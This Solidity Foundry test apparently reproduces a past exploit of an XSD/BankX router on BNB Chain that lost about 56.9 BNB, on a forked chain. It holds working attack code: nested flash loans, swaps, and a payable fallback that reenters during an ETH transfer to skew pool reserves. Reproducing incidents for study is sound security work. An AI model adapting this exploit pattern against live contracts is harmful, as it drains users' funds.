// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : ~ 56.9 BNB
// Attacker : https://bscscan.com/address/0x506eebd8d6061202a8e8fc600bb3d5d41f475ee1
// Attack Contract : https://bscscan.com/address/0x202e059a16d29a2f6ae0307ae3d574746b2b6305
// Vulnerable Contract : https://bscscan.com/address/0xfadda925e10d07430f5d7461689fd90d3d81bb48
// Attack Tx : https://bscscan.com/tx/0xbdf76f22c41fe212f07e24ca7266d436ef4517dc1395077fabf8125ebe304442

// @Info
// Vulnerable Contract Code : https://bscscan.com/address/0xfadda925e10d07430f5d7461689fd90d3d81bb48#code

// @Analysis
// Twitter Guy : https://twitter.com/CertiKAlert/status/1706765042916450781
// invoke function burnpoolXSD() after executing TransferHelper.safeTransferETH();

interface IXSD is IERC20 {
    function burnpoolXSD(uint256 _xsdamount) external;
}

interface IXSDRouter {
    function swapXSDForETH(uint256 amountOut, uint256 amountInMax) external;
    function swapETHForBankX(uint256 amountOut) external payable;
}

interface IXSDWETHpool {
    function PERMIT_TYPEHASH() external pure returns (bytes32);
    function nonces(address owner) external view returns (uint256);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function price0CumulativeLast() external view returns (uint256);
    function price1CumulativeLast() external view returns (uint256);
    function kLast() external view returns (uint256);
    function collatDollarBalance() external returns (uint256);
    function swap(uint256 amount0Out, uint256 amount1Out, address to) external;
    function skim(address to) external;
    function sync() external;
}

interface IPIDController {
    function systemCalculations() external;
}

interface IDPPAdvanced {
    function flashLoan(uint256 baseAmount, uint256 quoteAmount, address assetTo, bytes calldata data) external;
}

contract ContractTest is Test {
    IWBNB WBNB = IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
    IDPPOracle DPPOracle = IDPPOracle(0xFeAFe253802b77456B4627F8c2306a9CeBb5d681);
    IDPPAdvanced DPPAdvance = IDPPAdvanced(0x81917eb96b397dFb1C6000d28A5bc08c0f05fC1d);
    IXSD XSD = IXSD(0x39400E67820c88A9D67F4F9c1fbf86f3D688e9F6);
    IXSDRouter Router = IXSDRouter(0xfADDa925e10d07430f5d7461689fd90d3D81bB48);
    IXSDWETHpool XSDWETHpool = IXSDWETHpool(0xbfBcB8BDE20cc6886877DD551b337833F3e0d96d);
    IPIDController PIDController = IPIDController(0x82a6405B9C38Eb1d012c7B06642dcb3D7792981B);

    uint256 baseAmount = 3_000_000_000_000_000_000_000;
    uint256 moreAmount = 1_000_000_000_000_000_000_000;
    uint256 attackAmount = 3_800_000_000_000_000_000_000;
    uint256 swapAmount = 263_932_735_529_288_914_857_295;
    uint256 exploitAmount = 56_964_339_410_199_718_035;

    function setUp() public {
        vm.createSelectFork("bsc", 32_086_901 - 1);
        vm.label(address(WBNB), "WBNB");
        vm.label(address(DPPOracle), "DPPOracle");
        vm.label(address(DPPAdvance), "DPPAdvance");
        vm.label(address(XSD), "XSD");
        vm.label(address(Router), "Router");
        vm.label(address(XSDWETHpool), "XSDWETHpool");
        vm.label(address(PIDController), "PIDController");
        deal(address(XSD), address(this), 39_566_238_265_722_260_955_438);
        approveAll();
    }

    function testExploit() external {
        uint256 startBNB = WBNB.balanceOf(address(this));
        console.log("Before Start: %d BNB", startBNB);

        DPPOracle.flashLoan(baseAmount, 0, address(this), abi.encode(baseAmount));

        uint256 intRes = WBNB.balanceOf(address(this)) / 1 ether;
        uint256 decRes = WBNB.balanceOf(address(this)) - intRes * 1e18;
        console.log("Attack Exploit: %s.%s BNB", intRes, decRes);
    }

    function DPPFlashLoanCall(address sender, uint256 amount, uint256 quoteAmount, bytes calldata data) external {
        if (abi.decode(data, (uint256)) == baseAmount) {
            DPPAdvance.flashLoan(moreAmount, 0, address(this), abi.encode(moreAmount));
            WBNB.transfer(address(DPPOracle), baseAmount);
        } else {
            uint256 amountOut = 9_840_000_000_000_000_000;
            Router.swapXSDForETH(amountOut, XSD.balanceOf(address(this)));
            XSD.transfer(address(XSDWETHpool), swapAmount);
            XSDWETHpool.swap(0, attackAmount + exploitAmount, address(this));
            WBNB.transfer(address(DPPAdvance), moreAmount);
        }
    }

    fallback() external payable {
        WBNB.transfer(address(XSDWETHpool), attackAmount);
        XSDWETHpool.swap(swapAmount, 0, address(this));
        PIDController.systemCalculations();
        Router.swapETHForBankX{value: 1_000_000_000_000}(100);
    }

    function approveAll() internal {
        WBNB.approve(0x224E13D9eAB11eDc09411ef4bF800791a7EF6135, type(uint256).max);
        WBNB.approve(address(Router), type(uint256).max);
        XSD.approve(address(Router), type(uint256).max);
    }
}
